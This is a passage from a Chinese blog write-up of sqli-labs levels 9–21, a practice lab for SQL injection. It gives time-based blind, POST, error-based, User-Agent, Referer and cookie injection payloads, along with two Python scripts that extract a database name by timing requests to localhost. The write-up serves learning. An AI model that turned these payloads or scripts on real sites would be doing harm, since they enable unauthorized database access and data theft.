    
    
    <tags>
      
      <tag>注入</tag>
      
      <tag>web</tag>
      
      <tag>盲注</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>sqli-labs的学习记录二（9-22）</title>
    <link href="/2018/08/03/sqli-labs2/"/>
    <url>/2018/08/03/sqli-labs2/</url>
    
    <content type="html"><![CDATA[<p>sqli-labs上的sql注入学习第二部分，上半部分（1-8）→<a href="https://lzy-wi.github.io/2018/07/20/sqli-labs1/" target="_blank" rel="noopener">sqli-labs的学习记录一</a><br><a id="more"></a></p><h5 id="第九关"><a href="#第九关" class="headerlink" title="第九关"></a>第九关</h5><p>&emsp;&emsp;布尔盲注是判断对错，第九关是基于时间的盲注，根据返回时间来判断。比如<code>(ascii(substr(database(),1,1))&gt;=97</code>,我们可以让这个判断语句正确延迟5秒返回，如果错误就正常返回。这里用到一个if函数，if（a,b,c）如果a正确就返回b，否则返回c。<br>所以最终payload为<br><pre><code class="hljs undefined">id=<span class="hljs-number">1</span>' and if(ascii(substr(database(),<span class="hljs-number">1</span>,<span class="hljs-number">1</span>))&gt;=<span class="hljs-number">97</span>,sleep(<span class="hljs-number">5</span>),sleep(<span class="hljs-number">0</span>)) -- +</code></pre></p><p>然后跟布尔盲注的方法一样一个一个的判断，时间上会比布尔盲注要多，要节省时间可以降低到2秒或者3秒,脚本基本上是抄第八关的，在判断方式上做了变动，思路不变。<br><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<span class="hljs-keyword">import</span> timetxt1 = <span class="hljs-string">"http://localhost/sqli-labs/Less-9/?id=1' and if(ascii(substr(database(),"</span>txt2 = <span class="hljs-string">",1))&gt;="</span>txt3 = <span class="hljs-string">",1))="</span>txt4 = <span class="hljs-string">",sleep(2),sleep(0)) -- +"</span>num11 = <span class="hljs-number">97</span>num12 = <span class="hljs-number">65</span>num13 = <span class="hljs-number">48</span>code = <span class="hljs-string">''</span>num1 = <span class="hljs-number">0</span>num2 = <span class="hljs-number">0</span>num3 = <span class="hljs-number">0</span><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(<span class="hljs-number">1</span>,<span class="hljs-number">9</span>):url = txt1+str(i)+txt2+str(num11)+txt4time1 = time.time()req = requests.get(url = url)time2 = time.time()<span class="hljs-keyword">if</span>(time2 - time1 &gt;=<span class="hljs-number">2</span>):num1 = <span class="hljs-number">1</span>url = txt1+str(i)+txt2+str(num12)+txt4time1 = time.time()req = requests.get(url = url)time2 = time.time()<span class="hljs-keyword">if</span>(time2 - time1 &gt;=<span class="hljs-number">2</span>):num2 = <span class="hljs-number">1</span>url = txt1+str(i)+txt2+str(num13)+txt4time1 = time.time()req = requests.get(url = url)time2 = time.time()<span class="hljs-keyword">if</span>(time2 - time1 &gt;=<span class="hljs-number">2</span>):num3 = <span class="hljs-number">1</span><span class="hljs-keyword">if</span>(num1 == <span class="hljs-number">1</span>):num = <span class="hljs-number">97</span>num += <span class="hljs-number">13</span>url = txt1+str(i)+txt2+str(num)+txt4time1 = time.time()req = requests.get(url = url)time2 = time.time()<span class="hljs-keyword">if</span>(time2 - time1 &gt;=<span class="hljs-number">2</span>):num += <span class="hljs-number">6</span><span class="hljs-keyword">else</span>:num -= <span class="hljs-number">7</span>url = txt1+str(i)+txt2+str(num)+txt4time1 = time.time()req = requests.get(url = url)time2 = time.time()<span class="hljs-keyword">if</span>(time2 - time1 &gt;=<span class="hljs-number">2</span>):num += <span class="hljs-number">3</span><span class="hljs-keyword">else</span>:num -= <span class="hljs-number">3</span>url = txt1+str(i)+txt2+str(num)+txt4time1 = time.time()req = requests.get(url = url)time2 = time.time()<span class="hljs-keyword">if</span>(time2 - time1 &lt;=<span class="hljs-number">2</span>):num -= <span class="hljs-number">3</span><span class="hljs-keyword">if</span>((num == <span class="hljs-number">106</span>) <span class="hljs-keyword">or</span> (num == <span class="hljs-number">119</span>)):<span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> range(num,num+<span class="hljs-number">4</span>):url = txt1+str(i)+txt3+str(j)+txt4time1 = time.time()req = requests.get(url = url)time2 = time.time()<span class="hljs-keyword">if</span>(time2 - time1 &gt;=<span class="hljs-number">2</span>):code += chr(j)<span class="hljs-keyword">print</span> codenum1 = <span class="hljs-number">0</span>num2 = <span class="hljs-number">0</span>num3 = <span class="hljs-number">0</span><span class="hljs-keyword">else</span>:<span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> range(num,num+<span class="hljs-number">3</span>):url = txt1+str(i)+txt3+str(j)+txt4time1 = time.time()req = requests.get(url = url)time2 = time.time()<span class="hljs-keyword">if</span>(time2 - time1 &gt;=<span class="hljs-number">2</span>):code += chr(j)<span class="hljs-keyword">print</span> codenum1 = <span class="hljs-number">0</span>num2 = <span class="hljs-number">0</span>num3 = <span class="hljs-number">0</span><span class="hljs-keyword">if</span>(num1 == <span class="hljs-number">0</span> <span class="hljs-keyword">and</span> num2 == <span class="hljs-number">1</span>):num = <span class="hljs-number">65</span>num += <span class="hljs-number">13</span>url = txt1+str(i)+txt2+str(num)+txt4time1 = time.time()req = requests.get(url = url)time2 = time.time()<span class="hljs-keyword">if</span>(time2 - time1 &gt;=<span class="hljs-number">2</span>):num += <span class="hljs-number">6</span><span class="hljs-keyword">else</span>:num -= <span class="hljs-number">7</span>url = txt1+str(i)+txt2+str(num)+txt4time1 = time.time()req = requests.get(url = url)time2 = time.time()<span class="hljs-keyword">if</span>(time2 - time1 &gt;=<span class="hljs-number">2</span>):num += <span class="hljs-number">3</span><span class="hljs-keyword">else</span>:num -= <span class="hljs-number">3</span>url = txt1+str(i)+txt2+str(num)+txt4time1 = time.time()req = requests.get(url = url)time2 = time.time()<span class="hljs-keyword">if</span>(time2 - time1 &lt;=<span class="hljs-number">2</span>):num -= <span class="hljs-number">3</span><span class="hljs-keyword">if</span>((num == <span class="hljs-number">74</span>) <span class="hljs-keyword">or</span> (num == <span class="hljs-number">87</span>)):<span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> range(num,num+<span class="hljs-number">4</span>):url = txt1+str(i)+txt3+str(j)+txt4time1 = time.time()req = requests.get(url = url)time2 = time.time()<span class="hljs-keyword">if</span>(time2 - time1 &gt;=<span class="hljs-number">2</span>):code += chr(j)<span class="hljs-keyword">print</span> codenum1 = <span class="hljs-number">0</span>num2 = <span class="hljs-number">0</span>num3 = <span class="hljs-number">0</span><span class="hljs-keyword">else</span>:<span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> range(num,num+<span class="hljs-number">3</span>):url = txt1+str(i)+txt3+str(j)+txt4time1 = time.time()req = requests.get(url = url)time2 = time.time()<span class="hljs-keyword">if</span>(time2 - time1 &gt;=<span class="hljs-number">2</span>):code += chr(j)<span class="hljs-keyword">print</span> codenum1 = <span class="hljs-number">0</span>num2 = <span class="hljs-number">0</span>num3 = <span class="hljs-number">0</span><span class="hljs-keyword">if</span>(num2 == <span class="hljs-number">0</span> <span class="hljs-keyword">and</span> num3 == <span class="hljs-number">1</span>):num =<span class="hljs-number">48</span>num += <span class="hljs-number">5</span>url = txt1+str(i)+txt2+str(num)+txt4time1 = time.time()req = requests.get(url = url)time2 = time.time()<span class="hljs-keyword">if</span>(time2 - time1 &gt;=<span class="hljs-number">2</span>):<span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> range(num,num+<span class="hljs-number">5</span>):url = txt1+str(i)+txt3+str(j)+txt4time1 = time.time()req = requests.get(url = url)time2 = time.time()<span class="hljs-keyword">if</span>(time2 - time1 &gt;=<span class="hljs-number">2</span>):code += chr(j)<span class="hljs-keyword">print</span> codenum1 = <span class="hljs-number">0</span>num2 = <span class="hljs-number">0</span>num3 = <span class="hljs-number">0</span><span class="hljs-keyword">else</span>:num -= <span class="hljs-number">5</span><span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> range(num,num+<span class="hljs-number">5</span>):url = txt1+str(i)+txt3+str(j)+txt4time1 = time.time()req = requests.get(url = url)time2 = time.time()<span class="hljs-keyword">if</span>(time2 - time1 &gt;=<span class="hljs-number">2</span>):code += chr(j)<span class="hljs-keyword">print</span> codenum1 = <span class="hljs-number">0</span>num2 = <span class="hljs-number">0</span>num3 = <span class="hljs-number">0</span></code></pre></p><p>附上截图<br><img src="/img/2018-08-03/1.png" srcset="/img/static/loading.gif" alt="1"></p><h5 id="第十关"><a href="#第十关" class="headerlink" title="第十关"></a>第十关</h5><p>也是时间盲注，基于双引号，把单引号变成双引号即可<br><pre><code class="hljs undefined"><span class="hljs-attribute">id</span>=1" <span class="hljs-keyword">and</span> <span class="hljs-keyword">if</span>(ascii(substr(database(),1,1))&gt;=97,sleep(5),sleep(0)) -- +</code></pre></p><h5 id="第十一关"><a href="#第十一关" class="headerlink" title="第十一关"></a>第十一关</h5><p>第十一关是基于单引号的post型注入，在f12下可以看到表单是post型以及两个参数<code>uname</code>和<code>passwd</code><br><img src="/img/2018-08-03/2.png" srcset="/img/static/loading.gif" alt="2"><br>post型注入要勾选上post data，最后不要忘记<code>submit=Submit</code><br><img src="/img/2018-08-03/3.png" srcset="/img/static/loading.gif" alt="3"><br>&emsp;&emsp;我在测试时发现我的火狐浏览器的hackbar在post方式下单引号测试excute点击没反应，（对于这个bug真的很迷，也有师兄曾经遇到过），无奈只能切换工具，chrome下的postman，效果也不怎么好，直接换了旧版本的火狐（56.0）<br>继续，在passwd后加个单引号直接报错，后面就跟第一关一样了，post表单payload如下<br><pre><code class="hljs undefined"><span class="hljs-attribute">uname</span>=123&amp;passwd=123' union select 1,database() -- +&amp;<span class="hljs-attribute">submit</span>=Submit</code></pre></p><p><img src="/img/2018-08-03/4.png" srcset="/img/static/loading.gif" alt="4"></p><h5 id="第十二关"><a href="#第十二关" class="headerlink" title="第十二关"></a>第十二关</h5><p>基于双引号的post型注入，跟第十一关一样，单引号替换双引号，测试发现报错，少了括号，payload如下<br><pre><code class="hljs undefined"><span class="hljs-attribute">uname</span>=123&amp;passwd=456") union select 1,database() -- + &amp;<span class="hljs-attribute">submit</span>=Submit</code></pre></p><p><img src="/img/2018-08-03/5.png" srcset="/img/static/loading.gif" alt="5"></p><h5 id="第十三关"><a href="#第十三关" class="headerlink" title="第十三关"></a>第十三关</h5><p>post型基于单引号的双注入，第五关讲过，直接拿第五关的payload<br><pre><code class="hljs undefined">uname=123&amp;passwd=123') union <span class="hljs-keyword">select</span> <span class="hljs-keyword">count</span>(*),<span class="hljs-keyword">concat_ws</span>(<span class="hljs-string">':'</span>,(<span class="hljs-keyword">select</span> <span class="hljs-keyword">database</span>()),<span class="hljs-keyword">floor</span>(<span class="hljs-keyword">rand</span>()*<span class="hljs-number">2</span>)) <span class="hljs-keyword">as</span> a <span class="hljs-keyword">from</span> information_schema.tables <span class="hljs-keyword">group</span> <span class="hljs-keyword">by</span> a<span class="hljs-comment">-- + &amp;submit=Submit</span></code></pre></p><p>一次没成功就多试几次<br><img src="/img/2018-08-03/6.png" srcset="/img/static/loading.gif" alt="6"></p><h5 id="第十四关"><a href="#第十四关" class="headerlink" title="第十四关"></a>第十四关</h5><p>post型基于双引号的双注入，跟第十三关一样，payload如下<br><pre><code class="hljs undefined">uname=123&amp;passwd=123" union <span class="hljs-keyword">select</span> <span class="hljs-keyword">count</span>(*),<span class="hljs-keyword">concat_ws</span>(<span class="hljs-string">':'</span>,(<span class="hljs-keyword">select</span> <span class="hljs-keyword">database</span>()),<span class="hljs-keyword">floor</span>(<span class="hljs-keyword">rand</span>()*<span class="hljs-number">2</span>)) <span class="hljs-keyword">as</span> a <span class="hljs-keyword">from</span> information_schema.tables <span class="hljs-keyword">group</span> <span class="hljs-keyword">by</span> a<span class="hljs-comment">-- + &amp;submit=Submit</span></code></pre></p><p><img src="/img/2018-08-03/7.png" srcset="/img/static/loading.gif" alt="7"></p><h5 id="第十五关"><a href="#第十五关" class="headerlink" title="第十五关"></a>第十五关</h5><p>post型单引号盲注，测试布尔型<br><pre><code class="hljs undefined"><span class="hljs-attr">uname</span>=<span class="hljs-number">123</span>&amp;passwd=<span class="hljs-number">123</span><span class="hljs-string">' or '</span><span class="hljs-number">1</span><span class="hljs-string">'='</span><span class="hljs-number">1</span> &amp;submit=Submit</code></pre></p><p><img src="/img/2018-08-03/8.png" srcset="/img/static/loading.gif" alt="8"><br>测试时间型失败，返回时间异常，经常是几分钟才有有回复，测试失败</p><h5 id="第十六关"><a href="#第十六关" class="headerlink" title="第十六关"></a>第十六关</h5><p>post型双引号盲注和第十五关一样<br><pre><code class="hljs undefined"><span class="hljs-attribute">uname</span>=123&amp;passwd=123") <span class="hljs-keyword">or</span> <span class="hljs-string">"1"</span>=<span class="hljs-string">"1"</span> -- + &amp;<span class="hljs-attribute">submit</span>=Submit</code></pre></p><p><img src="/img/2018-08-03/9.png" srcset="/img/static/loading.gif" alt="9"></p><h5 id="第十七关"><a href="#第十七关" class="headerlink" title="第十七关"></a>第十七关</h5><p>基于错误的更新查询post注入<br><strong>高版本的mysql已经修复了这个bug</strong><br>有兴趣的可以去了解下<br>–&gt;<a href="https://blog.csdn.net/Fly_hps/article/details/79416842" target="_blank" rel="noopener">传送门</a><br>–&gt;<a href="https://blog.csdn.net/u012763794/article/details/51361152" target="_blank" rel="noopener">传送门</a><br>–&gt;<a href="https://www.cnblogs.com/xishaonian/p/6243497.html" target="_blank" rel="noopener">传送门</a></p><h5 id="第十八关"><a href="#第十八关" class="headerlink" title="第十八关"></a>第十八关</h5><p>请求头User-Agent注入（需要正确的用户名和密码），需要抓包，抓包工具burpsuit（不会使用的自行百度）<br>先抓包<br><img src="/img/2018-08-03/10.png" srcset="/img/static/loading.gif" alt="10"><br>在User-Agent后面加一个单引号<br><pre><code class="hljs undefined">User-<span class="hljs-string">Agent:</span> Mozilla<span class="hljs-regexp">/5.0 (Windows NT 10.0; Win64; x64; rv:56.0) Gecko/</span><span class="hljs-number">20100101</span> Firefox/<span class="hljs-number">56.0</span><span class="hljs-string">'</span></code></pre></p><p>发现报错，说明可以注入<br><img src="/img/2018-08-03/11.png" srcset="/img/static/loading.gif" alt="11"><br>一般这种注入的sql语句都是insert类型，查看index.php的查询关键代码<br><pre><code class="hljs undefined">$insert=<span class="hljs-string">"INSERT INTO `security`.`uagents` (`uagent`, `ip_address`, `username`) VALUES ('$uagent', '$IP', $uname)"</span><span class="hljs-comment">;</span></code></pre></p><p>因为这种方式注入没有回显，一般是基于时间的insert型盲注，通过判断返回时间来注入<br><em>user-agent简写成Mozilla/5.0 Firefox/56.0</em><br><pre><code class="hljs undefined">User-Agent: Mozilla/<span class="hljs-number">5.0</span> Firefox/<span class="hljs-number">56.0</span>' <span class="hljs-keyword">or</span> <span class="hljs-built_in">sleep</span>(<span class="hljs-number">5</span>) <span class="hljs-keyword">or</span> '</code></pre></p><p>最后要闭合单引号，不可以注释掉（我也不知道原因π_π）<br>5秒后返回正常页面<br><img src="/img/2018-08-03/12.png" srcset="/img/static/loading.gif" alt="12"><br>猜测数据库<br><pre><code class="hljs undefined">User-Agent: Mozilla/<span class="hljs-number">5.0</span> Firefox/<span class="hljs-number">56.0</span>' <span class="hljs-keyword">or</span> <span class="hljs-keyword">if</span>(ascii(substr((<span class="hljs-built_in">select</span> database()),<span class="hljs-number">1</span>,<span class="hljs-number">1</span>))&gt;<span class="hljs-number">97</span>,<span class="hljs-built_in">sleep</span>(<span class="hljs-number">5</span>),<span class="hljs-built_in">sleep</span>(<span class="hljs-number">0</span>)) <span class="hljs-keyword">or</span> '</code></pre></p><p>5秒后返回<br><img src="/img/2018-08-03/13.png" srcset="/img/static/loading.gif" alt="13"><br>盲注当然是写脚本跑啦,python脚本代码如下，稍微修改了一下之前的代码就可以了<br><pre><code class="hljs undefined">import requestsimport <span class="hljs-built_in">time</span>txt1 = <span class="hljs-string">"Mozilla/5.0 Firefox/56.0' or if(ascii(substr((select database()),"</span>txt2 = <span class="hljs-string">",1))&gt;="</span>txt3 = <span class="hljs-string">",1))="</span>txt4 = <span class="hljs-string">",sleep(2),sleep(0)) or '"</span><span class="hljs-built_in">key</span> = &#123;'uname':'admin','passwd':'admin','submit':'Submit'&#125;url = <span class="hljs-string">"http://localhost/sqli-labs/Less-18/"</span>num11 = <span class="hljs-number">97</span>num12 = <span class="hljs-number">65</span>num13 = <span class="hljs-number">48</span>code = ''num1 = <span class="hljs-number">0</span>num2 = <span class="hljs-number">0</span>num3 = <span class="hljs-number">0</span><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>,<span class="hljs-number">9</span>):payload = txt1+str(i)+txt2+str(num11)+txt4headers = &#123;'User-Agent': payload&#125;time1 = <span class="hljs-built_in">time</span>.<span class="hljs-built_in">time</span>()req = requests.post(url = url,data =<span class="hljs-built_in">key</span>,headers = headers)time2 = <span class="hljs-built_in">time</span>.<span class="hljs-built_in">time</span>()<span class="hljs-keyword">if</span>(time2 - time1 &gt;=<span class="hljs-number">2</span>):num1 = <span class="hljs-number">1</span>payload = txt1+str(i)+txt2+str(num12)+txt4headers = &#123;'User-Agent': payload&#125;time1 = <span class="hljs-built_in">time</span>.<span class="hljs-built_in">time</span>()req = requests.post(url = url,data =<span class="hljs-built_in">key</span>,headers = headers)time2 = <span class="hljs-built_in">time</span>.<span class="hljs-built_in">time</span>()<span class="hljs-keyword">if</span>(time2 - time1 &gt;=<span class="hljs-number">2</span>):num2 = <span class="hljs-number">1</span>payload = txt1+str(i)+txt2+str(num13)+txt4headers = &#123;'User-Agent': payload&#125;time1 = <span class="hljs-built_in">time</span>.<span class="hljs-built_in">time</span>()req = requests.post(url = url,data =<span class="hljs-built_in">key</span>,headers = headers)time2 = <span class="hljs-built_in">time</span>.<span class="hljs-built_in">time</span>()<span class="hljs-keyword">if</span>(time2 - time1 &gt;=<span class="hljs-number">2</span>):num3 = <span class="hljs-number">1</span><span class="hljs-keyword">if</span>(num1 == <span class="hljs-number">1</span>):<span class="hljs-built_in">num</span> = <span class="hljs-number">97</span><span class="hljs-built_in">num</span> += <span class="hljs-number">13</span>payload = txt1+str(i)+txt2+str(<span class="hljs-built_in">num</span>)+txt4headers = &#123;'User-Agent': payload&#125;time1 = <span class="hljs-built_in">time</span>.<span class="hljs-built_in">time</span>()req = requests.post(url = url,data =<span class="hljs-built_in">key</span>,headers = headers)time2 = <span class="hljs-built_in">time</span>.<span class="hljs-built_in">time</span>()<span class="hljs-keyword">if</span>(time2 - time1 &gt;=<span class="hljs-number">2</span>):<span class="hljs-built_in">num</span> += <span class="hljs-number">6</span><span class="hljs-keyword">else</span>:<span class="hljs-built_in">num</span> -= <span class="hljs-number">7</span>payload = txt1+str(i)+txt2+str(<span class="hljs-built_in">num</span>)+txt4headers = &#123;'User-Agent': payload&#125;time1 = <span class="hljs-built_in">time</span>.<span class="hljs-built_in">time</span>()req = requests.post(url = url,data =<span class="hljs-built_in">key</span>,headers = headers)time2 = <span class="hljs-built_in">time</span>.<span class="hljs-built_in">time</span>()<span class="hljs-keyword">if</span>(time2 - time1 &gt;=<span class="hljs-number">2</span>):<span class="hljs-built_in">num</span> += <span class="hljs-number">3</span><span class="hljs-keyword">else</span>:<span class="hljs-built_in">num</span> -= <span class="hljs-number">3</span>payload = txt1+str(i)+txt2+str(<span class="hljs-built_in">num</span>)+txt4headers = &#123;'User-Agent': payload&#125;time1 = <span class="hljs-built_in">time</span>.<span class="hljs-built_in">time</span>()req = requests.post(url = url,data =<span class="hljs-built_in">key</span>,headers = headers)time2 = <span class="hljs-built_in">time</span>.<span class="hljs-built_in">time</span>()<span class="hljs-keyword">if</span>(time2 - time1 &lt;=<span class="hljs-number">2</span>):<span class="hljs-built_in">num</span> -= <span class="hljs-number">3</span><span class="hljs-keyword">if</span>((<span class="hljs-built_in">num</span> == <span class="hljs-number">106</span>) <span class="hljs-keyword">or</span> (<span class="hljs-built_in">num</span> == <span class="hljs-number">119</span>)):<span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">num</span>,<span class="hljs-built_in">num</span>+<span class="hljs-number">4</span>):payload = txt1+str(i)+txt3+str(j)+txt4headers = &#123;'User-Agent': payload&#125;time1 = <span class="hljs-built_in">time</span>.<span class="hljs-built_in">time</span>()req = requests.post(url = url,data =<span class="hljs-built_in">key</span>,headers = headers)time2 = <span class="hljs-built_in">time</span>.<span class="hljs-built_in">time</span>()<span class="hljs-keyword">if</span>(time2 - time1 &gt;=<span class="hljs-number">2</span>):code += chr(j)<span class="hljs-built_in">print</span> codenum1 = <span class="hljs-number">0</span>num2 = <span class="hljs-number">0</span>num3 = <span class="hljs-number">0</span><span class="hljs-keyword">else</span>:<span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">num</span>,<span class="hljs-built_in">num</span>+<span class="hljs-number">3</span>):payload = txt1+str(i)+txt3+str(j)+txt4headers = &#123;'User-Agent': payload&#125;time1 = <span class="hljs-built_in">time</span>.<span class="hljs-built_in">time</span>()req = requests.post(url = url,data =<span class="hljs-built_in">key</span>,headers = headers)time2 = <span class="hljs-built_in">time</span>.<span class="hljs-built_in">time</span>()<span class="hljs-keyword">if</span>(time2 - time1 &gt;=<span class="hljs-number">2</span>):code += chr(j)<span class="hljs-built_in">print</span> codenum1 = <span class="hljs-number">0</span>num2 = <span class="hljs-number">0</span>num3 = <span class="hljs-number">0</span><span class="hljs-keyword">if</span>(num1 == <span class="hljs-number">0</span> <span class="hljs-keyword">and</span> num2 == <span class="hljs-number">1</span>):<span class="hljs-built_in">num</span> = <span class="hljs-number">65</span><span class="hljs-built_in">num</span> += <span class="hljs-number">13</span>payload = txt1+str(i)+txt2+str(<span class="hljs-built_in">num</span>)+txt4headers = &#123;'User-Agent': payload&#125;time1 = <span class="hljs-built_in">time</span>.<span class="hljs-built_in">time</span>()req = requests.post(url = url,data =<span class="hljs-built_in">key</span>,headers = headers)time2 = <span class="hljs-built_in">time</span>.<span class="hljs-built_in">time</span>()<span class="hljs-keyword">if</span>(time2 - time1 &gt;=<span class="hljs-number">2</span>):<span class="hljs-built_in">num</span> += <span class="hljs-number">6</span><span class="hljs-keyword">else</span>:<span class="hljs-built_in">num</span> -= <span class="hljs-number">7</span>payload = txt1+str(i)+txt2+str(<span class="hljs-built_in">num</span>)+txt4headers = &#123;'User-Agent': payload&#125;time1 = <span class="hljs-built_in">time</span>.<span class="hljs-built_in">time</span>()req = requests.post(url = url,data =<span class="hljs-built_in">key</span>,headers = headers)time2 = <span class="hljs-built_in">time</span>.<span class="hljs-built_in">time</span>()<span class="hljs-keyword">if</span>(time2 - time1 &gt;=<span class="hljs-number">2</span>):<span class="hljs-built_in">num</span> += <span class="hljs-number">3</span><span class="hljs-keyword">else</span>:<span class="hljs-built_in">num</span> -= <span class="hljs-number">3</span>payload = txt1+str(i)+txt2+str(<span class="hljs-built_in">num</span>)+txt4headers = &#123;'User-Agent': payload&#125;time1 = <span class="hljs-built_in">time</span>.<span class="hljs-built_in">time</span>()req = requests.post(url = url,data =<span class="hljs-built_in">key</span>,headers = headers)time2 = <span class="hljs-built_in">time</span>.<span class="hljs-built_in">time</span>()<span class="hljs-keyword">if</span>(time2 - time1 &lt;=<span class="hljs-number">2</span>):<span class="hljs-built_in">num</span> -= <span class="hljs-number">3</span><span class="hljs-keyword">if</span>((<span class="hljs-built_in">num</span> == <span class="hljs-number">74</span>) <span class="hljs-keyword">or</span> (<span class="hljs-built_in">num</span> == <span class="hljs-number">87</span>)):<span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">num</span>,<span class="hljs-built_in">num</span>+<span class="hljs-number">4</span>):payload = txt1+str(i)+txt3+str(j)+txt4headers = &#123;'User-Agent': payload&#125;time1 = <span class="hljs-built_in">time</span>.<span class="hljs-built_in">time</span>()req = requests.post(url = url,data =<span class="hljs-built_in">key</span>,headers = headers)time2 = <span class="hljs-built_in">time</span>.<span class="hljs-built_in">time</span>()<span class="hljs-keyword">if</span>(time2 - time1 &gt;=<span class="hljs-number">2</span>):code += chr(j)<span class="hljs-built_in">print</span> codenum1 = <span class="hljs-number">0</span>num2 = <span class="hljs-number">0</span>num3 = <span class="hljs-number">0</span><span class="hljs-keyword">else</span>:<span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">num</span>,<span class="hljs-built_in">num</span>+<span class="hljs-number">3</span>):payload = txt1+str(i)+txt3+str(j)+txt4headers = &#123;'User-Agent': payload&#125;time1 = <span class="hljs-built_in">time</span>.<span class="hljs-built_in">time</span>()req = requests.post(url = url,data =<span class="hljs-built_in">key</span>,headers = headers)time2 = <span class="hljs-built_in">time</span>.<span class="hljs-built_in">time</span>()<span class="hljs-keyword">if</span>(time2 - time1 &gt;=<span class="hljs-number">2</span>):code += chr(j)<span class="hljs-built_in">print</span> codenum1 = <span class="hljs-number">0</span>num2 = <span class="hljs-number">0</span>num3 = <span class="hljs-number">0</span><span class="hljs-keyword">if</span>(num2 == <span class="hljs-number">0</span> <span class="hljs-keyword">and</span> num3 == <span class="hljs-number">1</span>):<span class="hljs-built_in">num</span> =<span class="hljs-number">48</span><span class="hljs-built_in">num</span> += <span class="hljs-number">5</span>payload = txt1+str(i)+txt2+str(<span class="hljs-built_in">num</span>)+txt4time1 = <span class="hljs-built_in">time</span>.<span class="hljs-built_in">time</span>()req = requests.<span class="hljs-built_in">get</span>(url = url)time2 = <span class="hljs-built_in">time</span>.<span class="hljs-built_in">time</span>()<span class="hljs-keyword">if</span>(time2 - time1 &gt;=<span class="hljs-number">2</span>):<span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">num</span>,<span class="hljs-built_in">num</span>+<span class="hljs-number">5</span>):url = txt1+str(i)+txt3+str(j)+txt4headers = &#123;'User-Agent': payload&#125;time1 = <span class="hljs-built_in">time</span>.<span class="hljs-built_in">time</span>()req = requests.post(url = url,data =<span class="hljs-built_in">key</span>,headers = headers)time2 = <span class="hljs-built_in">time</span>.<span class="hljs-built_in">time</span>()<span class="hljs-keyword">if</span>(time2 - time1 &gt;=<span class="hljs-number">2</span>):code += chr(j)<span class="hljs-built_in">print</span> codenum1 = <span class="hljs-number">0</span>num2 = <span class="hljs-number">0</span>num3 = <span class="hljs-number">0</span><span class="hljs-keyword">else</span>:<span class="hljs-built_in">num</span> -= <span class="hljs-number">5</span><span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">num</span>,<span class="hljs-built_in">num</span>+<span class="hljs-number">5</span>):payload = txt1+str(i)+txt3+str(j)+txt4headers = &#123;'User-Agent': payload&#125;time1 = <span class="hljs-built_in">time</span>.<span class="hljs-built_in">time</span>()req = requests.post(url = url,data =<span class="hljs-built_in">key</span>,headers = headers)time2 = <span class="hljs-built_in">time</span>.<span class="hljs-built_in">time</span>()<span class="hljs-keyword">if</span>(time2 - time1 &gt;=<span class="hljs-number">2</span>):code += chr(j)<span class="hljs-built_in">print</span> codenum1 = <span class="hljs-number">0</span>num2 = <span class="hljs-number">0</span>num3 = <span class="hljs-number">0</span></code></pre></p><p><img src="/img/2018-08-03/14.png" srcset="/img/static/loading.gif" alt="14"></p><h5 id="第十九关"><a href="#第十九关" class="headerlink" title="第十九关"></a>第十九关</h5><p>跟第十八关一样，referer注入，也是insert语句<br>修改请求头<br><pre><code class="hljs undefined">Referer: http://localhost/sqli-labs/Less-19/' or if(ascii(substr((<span class="hljs-keyword">select</span> <span class="hljs-keyword">database</span>()),<span class="hljs-number">1</span>,<span class="hljs-number">1</span>))&gt;<span class="hljs-number">97</span>,<span class="hljs-keyword">sleep</span>(<span class="hljs-number">5</span>),<span class="hljs-keyword">sleep</span>(<span class="hljs-number">0</span>)) <span class="hljs-keyword">or</span> <span class="hljs-string">'</span></code></pre></p><p><img src="/img/2018-08-03/15.png" srcset="/img/static/loading.gif" alt="15"><br>5秒后页面返回正常，脚本参考上面的</p><h5 id="第二十关"><a href="#第二十关" class="headerlink" title="第二十关"></a>第二十关</h5><p>cookie注入，这一关要先登录，登陆后有cookie才可以注入<br>测试单引号，在cookie后面加一个单引号<br><img src="/img/2018-08-03/17.png" srcset="/img/static/loading.gif" alt="17"><br>用<code>order by</code>测试有多少列<br><pre><code class="hljs undefined">Cookie: <span class="hljs-attr">uname=</span>admin' <span class="hljs-keyword">order</span> <span class="hljs-title">by</span> <span class="hljs-number">4</span><span class="hljs-comment">#</span></code></pre></p><p><img src="/img/2018-08-03/18.png" srcset="/img/static/loading.gif" alt="18"><br>查数据库<br><pre><code class="hljs undefined">Cookie: uname=admin' <span class="hljs-built_in">union</span> <span class="hljs-built_in">select</span> <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,database() limit <span class="hljs-number">1</span>,<span class="hljs-number">1</span><span class="hljs-meta">#</span></code></pre></p><p><img src="/img/2018-08-03/19.png" srcset="/img/static/loading.gif" alt="19"><br>后面的一样了</p><div style="text-align: center">————————-2018-08-10更新————————-<br></div><h5 id="第二十一关"><a href="#第二十一关" class="headerlink" title="第二十一关"></a>第二十一关</h5><p>用<code>admin</code>，<code>admin</code>登陆后抓包看到cooie<br><pre><code class="hljs undefined">Cookie: <span class="hljs-attribute">uname</span>=YWRtaW4%3D</code></pre></p><p>url解码后<code>YWRtaW4=</code>，用base64尝试解码得到<code>admin</code>，那么cookie应该就是用了base64加密过的，和第二十关一样，多了base64加密，<br><pre><code class="hljs undefined"><span class="hljs-attribute">Cookie</span>: 